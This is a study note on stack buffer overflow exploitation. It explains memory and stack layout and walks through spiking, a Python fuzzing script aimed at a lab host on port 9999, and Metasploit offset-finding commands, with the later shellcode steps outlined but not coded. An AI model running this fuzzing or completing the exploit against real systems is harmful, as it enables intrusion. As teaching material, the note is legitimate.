# Buffer Overflow
## Anatomy of memory:
5 Stages:
 - Kernel
 - Stack
 - Heap
 - Data
 - Text
		
---
## Anatomy of the stack:
4 Stages:
   - ESP (Extended Stack Pointer)
   - Buffer Space
   - EBP (Extended Base Pointer)
   - EIP (Extended Instruction Pointer) / Return Address

When you enter characters, its stored in the buffer space.
In a bufferoverflow attack, you fill the buffer space, and start to write to the Extended Base Pointer, than to the Extended Intruction Pointer, where things goes interesting.
The EIP is a pointer address, that says where the next instruction will be. We use that to do some malicious activities, like a reverse shell.

---

## Steps to conduct a buffer overflow:

Step 1: Spiking (stats.spk, trun.spk)
        A method to find a vulnerable part of the program (generic_send_tcp)
stats.spk
~~~bash
s_readline();
s_string("STATS ");
s_string_variable("0");
~~~

Step 2: Fuzzing (1.py)
We send a bunch of characters to try to break the program

~~~bash
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
    	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.6',9999))
 
        s.send('TRUN /.:/' + buffer)
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100
    except:
    	print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
~~~

Step 3: Finding Offset (2.py)

If we can break it, we wanna find where we broke it, or the offset
~~~bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
~~~
using the pattern, we send it to the program and will check the EIP's value
In current case(386F4337)
~~~bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
"[*] Exact match at offset 2003"
~~~

Step 4: Overwriting EIP (3.py)
        With the offset we found, we try to overwrite the EIP

Step 5: Finding Bad Characters (4.py)
        We than find the bad characters, that can break our shellcode

Step 6: Finding the Right Module (5.py)
        We try to find something for example a dll file, that has no memory protection(no Rebase, no ASLR, no SafeSEN, no NXCompact, no OS D11) (mona modules)

Step 7: Generating Shellcode (6.py)
        We than generate the shellcode that will be use to get access to the machine
		